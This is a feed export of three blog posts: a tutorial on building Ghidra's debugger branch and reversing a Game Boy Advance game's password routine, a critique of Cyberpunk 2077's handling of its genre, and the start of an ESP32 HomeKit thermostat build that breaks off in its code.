<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src=""></p><h2 id="overview">Overview</h2><p><a href="https://twitter.com/NSACyber/status/1339652646513291264">Yesterday</a> the NSA Twitter account announced that a new branch of Ghidra has been release with the long-awaited debugging capability. This will allow for single-step debugging of a program within <a href="https://hackaday.io/course/172292-introduction-to-reverse-engineering-with-ghidra">Ghidra</a> through a GDB stub or other various debug mechanisms. To celebrate this (and my being stuck at home quarantining‚Ä¶) I wanted to review how to build this version of Ghidra and give an example of how to use this debugger on a fun target.</p><p>This post will explain the following:</p><ul><li>How to build the latest (or any) version of Ghidra using a <a href="https://github.com/dukebarman/ghidra-builder">Docker Container</a></li><li>How to build the Ghidra Eclipse plugins</li><li>How to build a program <a href="https://github.com/SiD3W4y/GhidraGBA">loader</a> for Ghidra</li><li>Debugging a program with Ghidra using the GDB stub</li><li>Use the debugging capability to help us learn about how passwords are processed for a GBA game</li></ul><p>For this post, we‚Äôre going to be taking a look at the Game Boy Advance game Spiderman: Mysterio‚Äôs Menace. I‚Äôve been very much inspired by all of the awesome work that <a href="https://youtu.be/VVbRe7wr3G4">stacksmashing and Liveoverflow have been doing regarding these topics</a>. This was a game that I spent a lot of time playing and it‚Äôs always fun revisiting childhood favorites from an RE perspective. The ultimate goal is to demonstrate how to properly load this ROM using a custom loader, and connect to an emulator‚Äôs GDB stub using Ghidra‚Äôs debugging features.</p><p><strong>RE Note/Tangent:</strong> When taking on a new reversing project, it‚Äôs important to try to compartmentalize goals and targets. For example, if we said we just want to <em>reverse</em> this game, that opens up endless possibilities. We could reverse engineer the collision detection, how enemy AI works, or how level maps are generated. For this post, we will pick a specific target and take a look at the password mechanism in use by this game.</p><p>I am doing all of this work on an Ubuntu 20.04 machine, with the latest updates.</p><h2 id="building-ghidra">Building Ghidra</h2><p>First things first, this debugger branch has not yet been included in an official release so we‚Äôre going to have to build it ourselves. Luckily for us <a href="https://github.com/dukebarman/ghidra-builder">dukebarman</a> has put together a docker container for us to do this, all we need to do is modify the <code>build_ghidra.sh</code> script to checkout the debugger branch, see the following line below:</p><div><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>git clone https://github.com/NationalSecurityAgency/ghidra -b debugger
</pre></td></tr></tbody></table></code></p></div><p>We are also going to build the Eclipse development extensions for this version of Ghidra, this will help us later on when we build a loader and write our analysis scripts. To do this we add the following line to the <code>build_ghidra.sh</code> script:</p><div><p><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>gradle prepDev
gradle eclipse -PeclipsePDE
</pre></td></tr></tbody></table></code></p></div><p>Next follow the instructions in the <code>README</code>:</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>cd ghidra-builder
sudo docker-tpl/build
cd workdir
sudo ../docker-tpl/run ./build_ghidra.sh
</pre></td></tr></tbody></table></code></p></div><p>This will take some time, so maybe go grab a coffee or two and come back to your freshly built Ghidra. The resulting build can be found in <code>workdir/out</code>:</p><div><p><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>wrongbaud@wubuntu:~/blog/gba-re-gbd/ghidra-builder/workdir$ ls out/
ghidra_9.3_DEV_20201218_linux64.zip
</pre></td></tr></tbody></table></code></p></div><p>Unzip this file, and you can launch Ghidra via the <code>./ghidraRun</code> script. For this post, I will unzip this into the <code>ghidra-builder/workdir</code> directory because we‚Äôre going to be using the docker container to build a Ghidra loader for this version of Ghidra. If you‚Äôre following along, your workdir directory should look like this:</p><div><p><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>wrongbaud@wubuntu:~/blog/gba-re-gbd/ghidra-builder/workdir$ ls
build_ghidra.sh  ghidra  ghidra_9.3_DEV out  set_exec_flag.sh
</pre></td></tr></tbody></table></code></p></div><h2 id="building-eclipse-plugins">Building Eclipse Plugins</h2><p>Now that we have a new version of Ghidra built, we also need to build the GhidraDev plugin for Eclipse. The eclipse projects can be found in the <code>ghidra-builder/workdir/ghidra/GhidraBuild/EclipsePlugins/GhidraDev</code> directory.</p><ol><li>Install <a href="https://www.eclipse.org/downloads/packages/installer">Eclipse</a><ul><li>Select the Java IDE</li></ul></li><li>Install CDT, PyDev, and Plugin Development Environment<ul><li>This can be done from the Eclipse marketplace</li></ul></li><li>Import the GhidraDevFeature and GhidraDevPlugin projects<ul><li>These can be found in the <code>ghidra-builder/workdir/ghidra/GhidraBuild/EclipsePlugins/GhidraDev/</code> directory</li><li><code>File</code> -&gt; <code>Import</code> -&gt; <code>General</code> -&gt; <code>Existing Projects into Workspace</code></li><li>Add <code>ghidra-builder/workdir/ghidra/GhidraBuild/EclipsePlugins/GhidraDev</code></li><li>Select ‚ÄúSearch for nested projects‚Äù</li><li>Import the projects!</li><li><strong>Note:</strong> you may see some build errors when these are imported, you can ignore these as you are just exporting the plugin!</li></ul></li><li>With these projects loaded, we can now <a href="https://github.com/NationalSecurityAgency/ghidra/blob/debugger/GhidraBuild/EclipsePlugins/GhidraDev/GhidraDevPlugin/build_README.txt">export the plugin</a><ul><li><code>File</code> -&gt; <code>Export</code></li><li><code>Plug-in Development</code> -&gt; <code>Deployable Features</code></li><li><code>ghidradev.ghidradev</code></li><li>Select an archive location for the plugin to be exported to</li><li>Click Finish!</li></ul></li></ol><p>Now we have our Ghidra plugin, built for our custom version of Ghidra that we can load via <code>Help</code>-&gt;<code>Install New Software</code>.</p><p>And with that, we have built Ghidra from the <code>debugger</code> branch, and have also built the Eclipse development extensions so we can build plugins for our new version of Ghidra!</p><p><strong>Note:</strong> I just want to take a second to outline just how incredible the <a href="https://github.com/NationalSecurityAgency/ghidra/blob/15c1f43fa51f210836cb451aff587b227dffe0a7/DevGuide.md">help docs</a> are for Ghidra. From the P-Code manuals to the instructions on building and exporting these plugins - the project is very well documented.</p><h2 id="building-the-rom-loader">Building the ROM Loader</h2><p>To properly analyze this ROM in Ghidra, we are going to need to define all of the <a href="https://problemkaputt.de/gbatek.htm#gbamemorymap">memory regions and peripherals</a> for the Game Boy Advance. Luckily for us, <a href="https://github.com/SiD3W4y/GhidraGBA">SiD3W4y</a> on GitHub has already written one.</p><p>If you are a regular reader of this blog, a <a href="https://wrongbaud.github.io/posts/writing-a-ghidra-loader/">ghidra loader</a> may be a familiar subject to you. If not, the purpose of a Ghidra loader is to set up all of the necessary memory regions, identify any debug information or symbols that may be present in the file, and provide as much information as possible about the target file. The loader that was mentioned before outlines all of the basic peripherals of the GBA and is an excellent example loader to work with, let‚Äôs start by cloning it into the <code>ghidra-builder/workdir</code> directory. We‚Äôre doing this because we‚Äôre going to use the same docker container we built Ghidra with to build this loader.</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre>cd ghidra-builder/workdir
git clone https://github.com/SiD3W4y/GhidraGBA
sudo ../docker-tpl/run /bin/bash
dockerbot@797eb43ce05f:/files/GhidraGBA$ export GHIDRA_INSTALL_DIR=/files/ghidra_9.3_DEV/
dockerbot@797eb43ce05f:/files/GhidraGBA$ gradle
dockerbot@797eb43ce05f:/files/GhidraGBA$ cp dist/ghidra_9.3_DEV_20201218_GhidraGBA.zip ../ghidra_9.3_DEV/Extensions/Ghidra/
dockerbot@797eb43ce05f:/files/GhidraGBA$ exit
exit
</pre></td></tr></tbody></table></code></p></div><p>In case the above steps are confusing, what we are doing is:</p><ol><li>Launching the docker container</li><li>Building the GhidraGBA extension, providing the path to our installation</li><li>Copying it to Ghidra‚Äôs extensions directory (so it will show up under the Install Extensions menu)</li><li>Exiting the docker container</li></ol><p>Launch Ghidra via <code>ghidraRun</code> and go to <code>File</code>-&gt; <code>Install Extensions</code>. Select the GhidraGBA loader and click <code>OK</code>. You will need to restart Ghidra for the change to take effect. Now when you load a GBA ROM you should see the following:</p><p><img data-src="https://wrongbaud.github.io/assets/img/ghidra-dbg/gba.png" alt="GBA" src="https://wrongbaud.github.io/assets/img/ghidra-dbg/gba.png"></p><p>After running the auto analysis, Ghidra seems to make a pretty quick sense of the ROM. There are a lot of functions defined and things are looking good. So the next step is to figure out some way to narrow down what we care about in this ROM image, in other words, we need to find our needle in the haystack. Let‚Äôs start by examining how the password system works in this game by entering a few passwords.</p><h2 id="analyzing-the-rom">Analyzing the Rom</h2><p>As mentioned before, our goal here is to try to understand the password system in use by this game. If we attempt to enter a password, the following screen is displayed:</p><p><img data-src="https://wrongbaud.github.io/assets/img/ghidra-dbg/rom-1.png" alt="ROM1" src="https://wrongbaud.github.io/assets/img/ghidra-dbg/rom-1.png"></p><p>Note that we have all of the consonants and no vowels and numbers ‚Äú0-9‚Äù, and our passwords are only 5 characters long. This is a nice starting point for us as reverse engineers. We can use this information to help us narrow down functions of interest. For example- let‚Äôs look through the strings in the ROM and see if these values are represented in a string somewhere. If we open the strings window, <code>Window</code> -&gt; <code>Defined Strings</code>, and filter for the first 5 characters available to us as password characters we see the following:</p><p><img data-src="https://wrongbaud.github.io/assets/img/ghidra-dbg/strings-password-characters.png" alt="" src="https://wrongbaud.github.io/assets/img/ghidra-dbg/strings-password-characters.png"></p><p>So far so good - we only have two instances of this string in use. One is located at <code>0x804c11fc</code> and one at <code>0x84b86f0</code>. Upon examination of the first one, we see that this string gets passed to a function in the subroutine located at <code>0x8003358</code>, see below:</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td><pre><span>undefined4</span> <span>passwd_1</span><span>(</span><span>int</span> <span>param_1</span><span>,</span><span>int</span> <span>param_2</span><span>)</span>

<span>{</span>
  <span>int</span> <span>iVar1</span><span>;</span>
  <span>uint</span> <span>uVar2</span><span>;</span>
  <span>uint</span> <span>uVar3</span><span>;</span>
  <span>undefined4</span> <span>in_lr</span><span>;</span>
  <span>undefined</span> <span>auStack52</span> <span>[</span><span>36</span><span>];</span>
  <span>undefined4</span> <span>uStack4</span><span>;</span>
  
  <span>uStack4</span> <span>=</span> <span>in_lr</span><span>;</span>
  <span>FUN_080231f4</span><span>(</span><span>auStack52</span><span>,</span><span>"BCDFGHJKLMNPQRSTVWXYZ0123456789-"</span><span>,</span><span>0x21</span><span>);</span>
  <span>*</span><span>(</span><span>uint</span> <span>*</span><span>)(</span><span>param_1</span> <span>+</span> <span>0x8c</span><span>)</span> <span>=</span> <span>0</span><span>;</span>
  <span>FUN_080025f8</span><span>(</span><span>param_1</span><span>);</span>
  <span>FUN_08002674</span><span>(</span><span>param_1</span><span>);</span>
  <span>FUN_08002714</span><span>(</span><span>param_1</span><span>);</span>
  <span>FUN_0800282c</span><span>(</span><span>param_1</span><span>);</span>
  <span>iVar1</span> <span>=</span> <span>0</span><span>;</span>
  <span>uVar3</span> <span>=</span> <span>*</span><span>(</span><span>uint</span> <span>*</span><span>)(</span><span>param_1</span> <span>+</span> <span>0x8c</span><span>);</span>
  <span>uVar2</span> <span>=</span> <span>0</span><span>;</span>
  <span>do</span> <span>{</span>
    <span>*</span><span>(</span><span>undefined</span> <span>*</span><span>)(</span><span>param_2</span> <span>+</span> <span>iVar1</span><span>)</span> <span>=</span> <span>auStack52</span><span>[</span><span>uVar3</span> <span>&gt;&gt;</span> <span>(</span><span>uVar2</span> <span>&amp;</span> <span>0xff</span><span>)</span> <span>&amp;</span> <span>0x1f</span><span>];</span>
    <span>uVar2</span> <span>=</span> <span>uVar2</span> <span>+</span> <span>5</span><span>;</span>
    <span>iVar1</span> <span>=</span> <span>iVar1</span> <span>+</span> <span>1</span><span>;</span>
  <span>}</span> <span>while</span> <span>(</span><span>iVar1</span> <span>&lt;</span> <span>5</span><span>);</span>
  <span>return</span> <span>uStack4</span><span>;</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>Notice also the while loop that is looping while a variable is less than five, this is a good indicator that this function might be useful as we know that the password length is 5! Let‚Äôs label it <code>passwd_1</code> and move onto the other uses of our character string. The next one that we can see is in the function at <code>0x8002CEC</code>, the decompilation can be seen below:</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre></td><td><pre><span>undefined8</span> <span>passwd_2</span><span>(</span><span>void</span><span>)</span>

<span>{</span>
  <span>int</span> <span>iVar1</span><span>;</span>
  <span>int</span> <span>iVar2</span><span>;</span>
  <span>uint</span> <span>uVar3</span><span>;</span>
  <span>undefined4</span> <span>in_lr</span><span>;</span>
  <span>undefined</span> <span>local_98</span> <span>[</span><span>5</span><span>];</span>
  <span>undefined</span> <span>local_93</span><span>;</span>
  <span>undefined</span> <span>auStack144</span> <span>[</span><span>36</span><span>];</span>
  <span>undefined</span> <span>auStack108</span> <span>[</span><span>8</span><span>];</span>
  <span>undefined</span> <span>auStack100</span> <span>[</span><span>72</span><span>];</span>
  <span>undefined4</span> <span>uStack4</span><span>;</span>
  
  <span>uStack4</span> <span>=</span> <span>in_lr</span><span>;</span>
  <span>FUN_08000b0c</span><span>(</span><span>0</span><span>,</span><span>1</span><span>,</span><span>0</span><span>,</span><span>0</span><span>);</span>
  <span>DAT_03001fd0</span><span>.</span><span>_0_2_</span> <span>=</span> <span>0x1444</span><span>;</span>
  <span>DISPCNT</span> <span>=</span> <span>0x1444</span><span>;</span>
  <span>FUN_0801e330</span><span>(</span><span>&amp;</span><span>DAT_0838277c</span><span>);</span>
  <span>iVar1</span> <span>=</span> <span>DAT_03001fe0</span><span>;</span>
  <span>FUN_080231f4</span><span>(</span><span>auStack144</span><span>,</span><span>"BCDFGHJKLMNPQRSTVWXYZ0123456789-"</span><span>,</span><span>0x21</span><span>);</span>
  <span>*</span><span>(</span><span>uint</span> <span>*</span><span>)(</span><span>iVar1</span> <span>+</span> <span>0x8c</span><span>)</span> <span>=</span> <span>0</span><span>;</span>
  <span>FUN_080025f8</span><span>(</span><span>iVar1</span><span>);</span>
  <span>FUN_08002674</span><span>(</span><span>iVar1</span><span>);</span>
  <span>FUN_08002714</span><span>(</span><span>iVar1</span><span>);</span>
  <span>FUN_0800282c</span><span>(</span><span>iVar1</span><span>);</span>
  <span>iVar2</span> <span>=</span> <span>0</span><span>;</span>
  <span>uVar3</span> <span>=</span> <span>0</span><span>;</span>
  <span>do</span> <span>{</span>
    <span>local_98</span><span>[</span><span>iVar2</span><span>]</span> <span>=</span> <span>auStack144</span><span>[</span><span>*</span><span>(</span><span>uint</span> <span>*</span><span>)(</span><span>iVar1</span> <span>+</span> <span>0x8c</span><span>)</span> <span>&gt;&gt;</span> <span>(</span><span>uVar3</span> <span>&amp;</span> <span>0xff</span><span>)</span> <span>&amp;</span> <span>0x1f</span>‚Ä¶</pre></td></tr></tbody></table></code></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wrongbaud.github.io/posts/ghidra-debugger/">https://wrongbaud.github.io/posts/ghidra-debugger/</a></em></p>]]>
            </description>
            <link>https://wrongbaud.github.io/posts/ghidra-debugger/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25553105</guid>
            <pubDate>Sun, 27 Dec 2020 18:29:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Cyberpunk 2077 Gets Wrong About the Genre]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25552923">thread link</a>) | @kiraleighleigh
<br/>
December 27, 2020 | https://blog.constelisvoss.ml/what-cyberpunk-2077-gets-wrong-about-the-genre/ | <a href="https://web.archive.org/web/*/https://blog.constelisvoss.ml/what-cyberpunk-2077-gets-wrong-about-the-genre/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Though this is a blog for media critiques, side stories for <a href="https://constelisvoss.ml/">CONSTELIS VOSS</a>, news, art posts, etc, I feel like the only place this article can live is <em>here</em>.</p><p>Not on <a href="https://weebtrash.ga/">weebtrash</a>. Not on <a href="https://medium.com/@kiraIeigh">Medium</a>. Not on <a href="https://www.linkedin.com/in/kirakiraleighleigh">LinkedIn</a>. Here, in a space centered on a sci-fi trilogy about robots, corruption, tropes, and what it means to be a person.</p><p>Cyberpunk 2077 was initially framed as an ambitious stab at a genre often overlooked in popular media; this was a promise.</p><p>Sadly, Cyberpunk 2077 misses the mark, despite being an overall very enjoyable game. CD Projekt Red's treatment of the genre is worse than the buggy launch, and I'm going to explain how and why.</p><p>First, let's explore two IPs that do it right. Then, we'll compare Cyberpunk 2077 against their core messaging.</p><p>Let's begin.</p><h2 id="how-ghost-in-the-shell-tackles-cyberpunk">How Ghost in the Shell Tackles Cyberpunk</h2><h3 id="all-barriers-are-moot">All barriers are moot</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/MOSHED-2020-12-4-13-22-6-2.gif" alt=""></figure><p>Wikipedia's explanation of the Cyberpunk genre:</p><blockquote><strong>Cyberpunk</strong> is a <a href="https://en.wikipedia.org/wiki/Subgenre">subgenre</a> of <a href="https://en.wikipedia.org/wiki/Science_fiction">science fiction</a> in a <a href="https://en.wikipedia.org/wiki/Dystopia">dystopian</a> <a href="https://en.wikipedia.org/wiki/Futurism">futuristic</a> setting that tends to focus on a "combination of <a href="https://en.wikipedia.org/wiki/Low-life">low-life</a> and <a href="https://en.wikipedia.org/wiki/High_tech">high tech</a>"<sup><a href="https://en.wikipedia.org/wiki/Cyberpunk#cite_note-1">[1]</a></sup> featuring advanced technological and scientific achievements, such as <a href="https://en.wikipedia.org/wiki/Artificial_intelligence">artificial intelligence</a> and <a href="https://en.wikipedia.org/wiki/Cybernetics">cybernetics</a>, juxtaposed with a degree of breakdown or radical change in the <a href="https://en.wikipedia.org/wiki/Social_order">social order</a>.</blockquote><p>But it's so much more than that. Look no further than <a href="https://en.wikipedia.org/wiki/Ghost_in_the_Shell">Ghost in the Shell</a> for a deeper examination.</p><p>Ghost in the Shell is about a lot of things, but what makes it a great overview of the genre itself is that Motoko Kusanagi‚Äîthe protagonist‚Äîisn't limited by her physical body.</p><p>The body is a tool. The soul (Ghost) is what matters, and even that can be reconfigured, if one chooses.</p><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/OK6W_koKDTOqqqLDbIoPAvKwT3u7zGxQ6vZ1ij2uHr8.gif" alt=""></figure><p>Motoko moves through cyberspace, breaks her body to fight her opponents, and exists as a tour de force in a landscape of corruption.</p><p>As the IP has multiple iterations, different topics take the forefront in different mediums. However, Motoko is always the through-line; a cybernetic warrior who uses a canonically pleasure-district shell, augmented to beat the crap out of her opponents, regardless of the physical costs.</p><p>Furthermore, in the 90s movie, she meets a sentient AI who she merges with to yet again break human barriers (and touch on sentiency).</p><p>Barriers are no object, and choices are fathomless, despite being in a world of corruption. Cyberpunk technology affords this.</p><p>That is the backbone of the Cyberpunk genre, as explained by Ghost in the Shell. </p><h2 id="how-blade-runner-tackles-cyberpunk">How Blade Runner tackles Cyberpunk</h2><h3 id="what-is-sentiency-what-is-agency">What is sentiency? What is agency?</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/f11157d2551ba0894c07a55b5f0dd9aa.gif" alt=""></figure><p>The original <a href="https://en.wikipedia.org/wiki/Blade_Runner">Blade Runner</a> film centers around synthetic beings (replicants) going rogue. Harrison Ford's Deckard is on a mission to reel-in misbehaving androids; that's the low media literacy baby-shit-brain reading.</p><p>You could also read Deckard as possibly being a synth himself. Or, you could read Deckard's attraction to Rachael‚Äîa replicant‚Äîas a question about love. Can androids truly love?</p><p>You could also read it as a commentary on sentiency via Pris and Roy's (both replicants) existential crises.</p><p>In the new film, <a href="https://en.wikipedia.org/wiki/Blade_Runner_2049">Blade Runner 2049</a>, you could read Gosling's K‚Äîanother replicant‚Äîas experiencing true personhood through the juxtaposition of who he isn't.</p><p>By questioning his place in the narrative when he realizes his memories are fake, he explodes with emotion, and dies with the knowledge that he's challenged what he even is. That's sentiency, baby.</p><p>There are many concepts in the Blade Runner movies, and the <a href="https://en.wikipedia.org/wiki/Do_Androids_Dream_of_Electric_Sheep%3F">novel </a>they're based on, but all of them grapple with these topics:</p><p>Who gets to be a person, who gets to be free, who gets to feel, who gets to live, and who doesn't.</p><p>The backbone of the Blade Runner IP exists to question these aspects of sentiency and agency.</p><p>So what does Cyberpunk 2077 do with GiTS' and Blade Runner's hot-takes?</p><h2 id="cyberpunk-2077-fumbles-barriers-are-moot">Cyberpunk 2077 fumbles "barriers are moot"</h2><h3 id="the-body-is-not-sacred-game-director-adam-badowski">The body is not sacred, game director Adam Badowski</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/MOSHED-2020-12-4-14-50-53-2.gif" alt=""></figure><blockquote>"This is cyberpunk, so people augment their body. So the body is no longer sacrum [sacred]; it's profanum [profane]. Because people modify everything, they are losing their connection to the body, to the meat. And that's why we need to use the nudity in many situations."</blockquote><p>The Cyberpunk genre is about the philosophy of personhood and human existence as juxtaposed to and twisted against technology, set upon a backdrop of corporate dystopia.</p><p>Not only are Badowski's statements ignorant of the genre, but the way Cyberpunk 2077 handles these topics is, too.</p><p>You cannot augment your character within an inch of their life. You cannot even cut their hair after the initial character generation screen. </p><p>You cannot become a 9 foot chrome-lacquered war-machine with a car engine for a crotch. You can't swap your consciousness into something else.</p><p>Because we know other characters <em><strong>can,</strong></em> Cyberpunk 2077 offers the illusion of choice by showing it exists, but barely gives it to the player.</p><p>Speaking of barely; though you can swap voice/junk gender, this doesn't break down gender barriers meaningfully.</p><p>You cannot blur the lines of sexuality, because your romance options are very limited. Have a male voice but a female body? Many routes are off the table. However, the problem isn't so much that characters [to reflect IRL people] have certain 'equipment' preferences. That's valid.</p><p>The problem is that players <em><strong>should</strong></em> be able to have a car engine for a crotch and see how that shakes things up, for example. If it does at all. </p><p>This is the one genre that <em>most</em> benefits from a predominantly bisexual romance roster, or at the very least, it benefits from having the balls to tackle the transhumanism topic.</p><p>When corporations plaster ads inside of your eyeballs, the only thing left is the ability to transform yourself beyond limits. One of those limits is the self. </p><p>The other is grappling with what the self means when you replace it with cyberware, and what flavor of human <em>other </em>people see you as.</p><p>Cyberpunk 2077 does make a stance on this, and it's not as expected; too much self-reconfiguration makes you a Cyberpsycho. NPCs lose their mind if they replace too many parts.</p><p>This shows us that the "flesh as sacrum" aspect is unavoidable. </p><p>Because of all this, Cyberpunk 2077 smacks into the "barriers are moot" genre-point like V's car barrels down roads with the finesse of a bull in a china shop.</p><p>It's nothing but barriers, with the veneer of choice.</p><h2 id="cyberpunk-2077-mishandles-the-sentiency-agency-question">Cyberpunk 2077 mishandles "the sentiency/agency question"</h2><h3 id="despite-the-attention-paid-to-johnny-invading-your-shell">Despite the attention paid to Johnny invading your shell</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/cyberpunk2077-1.jpg" alt=""></figure><p>Does Cyberpunk 2077 address "the sentiency/agency question"? Keanu's Johnny Silverhands invades your shell, which suggests it does, but there's a problem.</p><p>In order to analyze this, we have to talk about the results. There are 5 endings, and all of them are a flavor of "you die because your body is beyond saving", "Johnny takes over" or "go to cyberjail while Arasaka figures out how to ya yeet you." </p><p>Only two routes shake things up, and one is "commit suicide" while the other is "fuck off somewhere to solve the problem, off-screen."</p><p>The issue? There are in-game lore "outs" to suggest personhood doesn't stop at meat suits. Lizzy Wizzy's download into a synth body comes to mind; is she not a person? The game thinks so, yet Johnny robs you of agency histrionically. </p><p>What of Alt, Johnny's past love-interest and now-sentient-AI? A missed opportunity to smash barriers, and also tackle the sentiency question. Alt has lost her "soul".</p><p>There are repercussions to digitization, even if Judy's route later explains she figured out how to dabble in recorded/shared emotions, via BD devices. Even if Arasaka <em>already</em> upgraded the engram system.</p><p>It's almost as though the cast's skills/game lore never applies breakthrough tech to your problem, until it's too late.</p><p>Can players invade the darkweb and chill with the rogue AIs? Yes, but we <em>can't</em> do it to save our own Ghost, because "the flesh is sacrum".</p><p>What of Delamain's rogue AI "children"? Surprisingly, you get to tackle the sentiency angle if you complete the Epistrophy side quests. You can honor the rogue AIs' wishes and merge them with Delamain's main personality.</p><p>Cyberpunk 2077 pretends all this technology is in its infancy to stop the player from questioning narrative choices. What it actually does is show what's possible, but <strong>not for you</strong>.</p><p>Why can't players live in the internet? Why can't they hop into a car? Why can't they download into a synth? Why can't they merge personalities with Johnny in a truly blended version, like Motoko in the GiTS 90s film?</p><p>Cyberpunk 2077 punishes players for the very concepts the Cyberpunk genre grapples with, and the game lore suggests it <em>can</em> tackle.</p><p>Who gets to be a person even if they're inside a fucking toaster? Cars, Lizzy Wizzy, and Johnny. Not the player.</p><h2 id="and-what-of-the-punk-aspect-of-cyberpunk">And what of the Punk aspect of Cyberpunk?</h2><h3 id="well-it-s-lip-service-is-the-thing">Well, it's lip-service, is the thing</h3><figure><img src="http://blog.constelisvoss.ml/content/images/2020/12/cyberpunk2077_hand_cmyk_wide-959129cd7f84b90547ac1c88d90ec6bae3b98186.jpg" alt=""></figure><p>As stated: in the genre you have body augmentation, boundary scuttling, and transhumanism as rebellion options. Another is fighting the corporatization of the self and others. That's where the Punk aspect comes in.</p><p>Though Johnny invading your shell is a nice thematic touch, he's mostly concerned with Big Corp Arasaka. He judges your character harshly if they care about plenty of <em>other</em> rebellions. </p><p>For instance, sentient AI cars get more sympathy from Johnny than the dolls of The Clouds (who are human sex workers). That's not very Punk, Johnny.</p><p>Somehow, Takemura's plot is more on-point here, as an examination of Arasaka as child-soldier creators, and yet I don't see him staging some mass "free the kids" rebellion.</p><p>To make matters worse, you can't defy the cops; killing criminals helps the police, as a feature not a bug. In order to get the gear/money you need to progress, this is basically unavoidable. If you do try to avoid it, this cuts a shitload of content out.</p><p>River Ward's side quest examines this, as the one good cop in Night City. However, his quest doesn't let you stage a rebellion against the corrupt police force. His plot-line is ripe for this aspect of Punk.</p><p>Even the 3 initial 'camps' you choose don't tango with the Punk aspect. After the first 20 minutes, all you get are dialog options. There should've been a way to join ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.constelisvoss.ml/what-cyberpunk-2077-gets-wrong-about-the-genre/">https://blog.constelisvoss.ml/what-cyberpunk-2077-gets-wrong-about-the-genre/</a></em></p>]]>
            </description>
            <link>https://blog.constelisvoss.ml/what-cyberpunk-2077-gets-wrong-about-the-genre/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25552923</guid>
            <pubDate>Sun, 27 Dec 2020 18:09:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building my own HomeKit Thermostat]]>
            </title>
            <description>
<![CDATA[
Score 187 | Comments 94 (<a href="https://news.ycombinator.com/item?id=25552889">thread link</a>) | @frenchie4111
<br/>
December 27, 2020 | https://www.staycaffeinated.com/2020/12/27/building-my-own-homekit-thermostat-v1 | <a href="https://web.archive.org/web/*/https://www.staycaffeinated.com/2020/12/27/building-my-own-homekit-thermostat-v1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content_area">
    <div>
        
            <h2 id="post_title">Building my own HomeKit Thermostat</h2>
        

        <p>I√¢‚Ç¨‚Ñ¢m pretty obsessed with controlling most of the electronics in my house from my
phone. One of the last remaining devices was the thermostat. I don√¢‚Ç¨‚Ñ¢t want a Nest
because it doesn√¢‚Ç¨‚Ñ¢t work with HomeKit, and I can√¢‚Ç¨‚Ñ¢t use an EcoBee because I don√¢‚Ç¨‚Ñ¢t
have a neutral wire. So I resolved to build my own.</p>

<p>If you are building your own thermostat, or any hardware really, and want some
help or just want to show it off, feel free to shoot me an email at mdl0394@gmail.com. 
Also I plan to continue to expand this project to have a screen and some buttons,
if you want to hear about that signup to my email list and I√¢‚Ç¨‚Ñ¢ll let you know when
I do it.</p>



<h2 id="figuring-out-hot-to-turn-on-the-heat">Figuring out hot to turn on the heat</h2>

<p>So I turns out my heater runs on a really simple control protocol. There are just
two wires run from the heater to the current thermostat, when you connect them it
turns on, and when you disconnect it turns off. The only unfortunate part of it is
that the wires are 24vac, so to be safe I need to use a solid state relay for
switching.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/5897a162a777067bc7469e501a50029f58c9efe6/cc305/images/homekit_thermostat/old_thermostat_closeup.jpeg" alt="Old Thermostat Closeup showing two pins that need to be connected"></p>



<h2 id="the-prototype">The prototype</h2>

<p>I am building this whole thing on an esp32, with a big overkill relay I got on
amazon prime. I will link the exact parts below. The current thermometer is an
old tmp102 sparkfun board I had lying around, but it√¢‚Ç¨‚Ñ¢s off by around 6 degrees,
so in v2 I will be replacing it with hopefully a more accurate one.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/ec16c9863aa710ab4101208bd7eebc89d316fecb/23983/images/homekit_thermostat/breadboard.jpeg" alt="Fully wired breadboard">
<img src="https://d33wubrfki0l68.cloudfront.net/81db446d96ed6124330e190aba1321f981d07adc/8d0da/images/homekit_thermostat/wall_taped.jpeg" alt="Breadboard taped to wall"></p>

<p>After wiring it all together, and taping it to my wall for a day or two, I was
satisfied with the components, and wanted to get started on prettying it up a bit.</p>



<h2 id="the-code">The code</h2>

<p>The thermostat control runs on a pretty simple state machine. I am a big fan of
drawing things out ahead of time, so I drew this diagram for myself before coding.
In C this is implemented as two enums (actions, states) and a bunch of switch case
statements.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/6d7680c909d72c389d076e0390408d1e44382733/c2055/images/homekit_thermostat/state_machine.png" alt="State machine for thermostat control"></p>

<p id="expand_model_code">Click Here to toggle the code</p>
<div id="model_code">
<pre><code>// Enums:

typedef enum {
    TC_HEATER_MODE_OFF,
    TC_HEATER_MODE_ON,
